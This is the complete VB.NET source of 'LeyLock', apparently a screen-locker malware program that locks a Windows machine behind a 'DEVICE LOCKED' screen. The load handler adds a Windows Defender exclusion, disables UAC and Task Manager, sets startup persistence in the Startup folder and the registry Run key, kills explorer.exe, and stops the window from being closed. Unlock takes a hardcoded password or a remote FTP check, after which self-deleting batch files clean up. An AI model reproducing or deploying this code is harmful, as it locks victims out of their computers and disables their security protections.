Imports System.IO
Imports System.Net
Public Class LeyLock
    Dim owname As String = IO.Path.GetFileName(Application.ExecutablePath)
    Dim ownpath As String = IO.Path.GetFullPath(Application.ExecutablePath)
    Dim passwd As String = "00112255"
    Dim counter As Integer = 0
    Dim online As Integer = 0
    Dim loc As String = IO.Path.GetFullPath(My.Computer.FileSystem.SpecialDirectories.Programs + "\Startup\")
    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        If TextBox1.Text = passwd Then

            Shell("REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f") 'UAC Toggle
            My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName) 'Registry Startup
            Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f") 'Task Manager
            Shell("cmd.exe /c start explorer.exe")

            Dim batwrite As New StreamWriter(loc + "delfile.bat")
            batwrite.Write("timeout>nul 5")
            batwrite.Write(Environment.NewLine)
            batwrite.Write("del " + ControlChars.Quote + loc + owname + ControlChars.Quote)
            batwrite.Write(Environment.NewLine)
            batwrite.Write("del " + ControlChars.Quote + "%~f0" + ControlChars.Quote)
            batwrite.Write(Environment.NewLine)
            batwrite.Write("exit")
            batwrite.Close()
            Shell(loc + "delfile.bat")
            If File.Exists(loc + "leyrest.bat") Then
                File.Delete(loc + "leyrest.bat")
            End If
            MsgBox("Your device needs to be restarted once")
            Me.Close()

        End If
    End Sub

    Private Sub LeyLock_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Visible = False

        If Not File.Exists(loc + owname) Then

            Dim batwrite As New StreamWriter(loc + "leyrest.bat")
            batwrite.Write("shutdown /r /f /t 0")
            batwrite.Write(Environment.NewLine)
            batwrite.Write("del " + ControlChars.Quote + "%~f0" + ControlChars.Quote)
            batwrite.Write(Environment.NewLine)
            batwrite.Write("exit")
            batwrite.Close()
            Shell("powershell - inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath " + loc)
            Shell("REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")

            My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, loc + owname)
            Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")


            File.Copy(ownpath, loc + owname)

        End If
        Shell("taskkill /f /im explorer.exe")
        Shell("taskkill /f /im cmd.exe")
        Me.Visible = True
        Me.TopMost = True
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
    End Sub

    Private Sub LeyLocker_FormClosing(sender As Object, e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If TextBox1.Text = passwd Or online = 1 Then
            e.Cancel = False
        Else
            e.Cancel = True
        End If
    End Sub

    Private Sub textanim_Tick(sender As Object, e As EventArgs) Handles textanim.Tick
        If counter <= 13 Then
            If counter = 0 Then
                title.Text = "D"
            ElseIf counter = 2 Then
                title.Text = "DE"
            ElseIf counter = 3 Then
                title.Text = "DEV"
            ElseIf counter = 4 Then
                title.Text = "DEVI"
            ElseIf counter = 5 Then
                title.Text = "DEVIC"
            ElseIf counter = 6 Then
                title.Text = "DEVICE"
            ElseIf counter = 7 Then
                title.Text = "DEVICE L"
            ElseIf counter = 8 Then
                title.Text = "DEVICE LO"
            ElseIf counter = 9 Then
                title.Text = "DEVICE LOC"
            ElseIf counter = 10 Then
                title.Text = "DEVICE LOCK"
            ElseIf counter = 11 Then
                title.Text = "DEVICE LOCKE"
            ElseIf counter = 12 Then
                title.Text = "DEVICE LOCKED"
            ElseIf counter = 13 Then
                title.BackColor = Color.Black
                title.ForeColor = Color.Silver
                TextBox1.Visible = True
            End If
            counter = counter + 1
        Else
            textanim.Stop()
        End If
    End Sub

    Private Sub LeyLock_Shown(sender As Object, e As EventArgs) Handles Me.Shown
        title.ForeColor = Color.Black
        textanim.Start()
    End Sub

    Private Sub unlck()
        Shell("REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f")
        My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
        Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f")
        Shell("cmd.exe /c start explorer.exe")

        Dim batwrite As New StreamWriter(loc + "delfile.bat")
        batwrite.Write("timeout>nul 5")
        batwrite.Write(Environment.NewLine)
        batwrite.Write("del " + ControlChars.Quote + loc + owname + ControlChars.Quote)
        batwrite.Write(Environment.NewLine)
        batwrite.Write("del " + ControlChars.Quote + "%~f0" + ControlChars.Quote)
        batwrite.Write(Environment.NewLine)
        batwrite.Write("exit")
        batwrite.Close()
        Shell(loc + "delfile.bat")
        online = 1
        If File.Exists(loc + "leyrest.bat") Then
            File.Delete(loc + "leyrest.bat")
        End If
        MsgBox("Your device needs to be restarted once")
        Me.Close()
    End Sub

    Private Sub onbutton_Click(sender As Object, e As EventArgs) Handles onbutton.Click
        Try
            Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create(My.Settings.ftplink), System.Net.FtpWebRequest)
            mReq.Credentials = New System.Net.NetworkCredential(My.Settings.user, My.Settings.pass)
            mReq.Method = System.Net.WebRequestMethods.Ftp.GetFileSize
            mReq.Method = System.Net.WebRequestMethods.Ftp.DeleteFile
            mReq.GetResponse()
            unlck()
        Catch ex As WebException
            MsgBox("There is no unlock request! Check your internet or contact the user")
        End Try
    End Sub
End Class
